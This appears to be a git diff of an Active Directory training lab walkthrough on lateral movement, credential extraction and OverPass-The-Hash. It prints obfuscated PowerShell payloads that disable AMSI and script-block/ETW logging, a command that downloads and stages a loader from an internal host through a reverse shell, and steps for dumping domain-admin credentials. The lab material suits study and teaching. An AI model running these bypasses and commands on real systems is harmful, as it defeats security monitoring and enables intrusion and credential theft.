@@ -1,4 +1,4 @@
-# Learning Objective 07 (Domain Privilege Escalation, Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash)
+# Learning Objective 07 (Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash)
 
 ## Tasks
 
@@ -130,12 +130,19 @@ Note: **PowerShell transcripts persist on disk, and there is no known in-memory 
 
 Note that we could also paste the contents of `sbloggingbypass.txt` in place of the `download-exec` cradle.
 
-![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `type C:\AD\Tools\sbloggingbypass.txt`:
 ```powershell
 [Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
 ```
+
+`type C:\AD\Tools\amsibypass.txt`:
+```powershell
+S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
 
 ![HFS - sbloggingbypass.txt](./assets/screenshots/learning_objective_07_hfs_sbloggingbypass.png)
 
@@ -215,6 +222,8 @@ Let's download `Loader.exe` on `dcorp-ci` and copy it from there to `dcorp-mgmt`
 
 Run the following command on the reverse shell.
 
+![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
+
 `iwr http://172.16.100.22/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
 Now, copy the `Loader.exe` to `dcorp-mgmt`.
@@ -268,11 +277,10 @@ SID               : S-1-5-21-719815819-3726368948-3917688648-1118
 ```
 
 Sweet! We got credentials of `svcadmin`, a domain administrator.
+Note that `svcadmin` is used as a service account (see  `Session` in the above output), so you can even get credentials in clear-text from lsasecrets!
 🚩
 
 - **Gain Access to the DC with DA Privileges using an OverPass-The-Hash Attack (for Lateral Movement)**
-
-Note that `svcadmin` is used as a service account (see  `Session` in the above output), so you can even get credentials in clear-text from lsasecrets!
 
 Now we can use OverPass-The-Hash (aka Pass-The-Key) to authenticate as `svcadmin` by replaying its credentials.
 
@@ -719,7 +727,7 @@ Start a cmd process using runas.
 
 `runas /user:dcorp\srvadmin /netonly cmd`:
 ```
-Enter the password for dcorp\srvadmin:
+Enter the password for dcorp\srvadmin:📌
 Attempting to start cmd as user "dcorp\srvadmin" ...
 ```
 
@@ -731,12 +739,12 @@ The new spawned process has `srvadmin` privileges.
 
 `whoami`:
 ```
-dcorp\student422
+dcorp\student422👤
 ```
 
 `hostname`:
 ```
-dcorp-std422
+dcorp-std422🖥️
 ```
 
 `whoami /groups`:
@@ -858,7 +866,7 @@ We need to start a process as `student422` using runas, otherwise gpmc doesn't g
 
 `runas /user:dcorp\student422 /netonly cmd`:
 ```
-Enter the password for dcorp\student422:
+Enter the password for dcorp\student422:📌
 Attempting to start cmd as user "dcorp\student422" ...
 ```
 
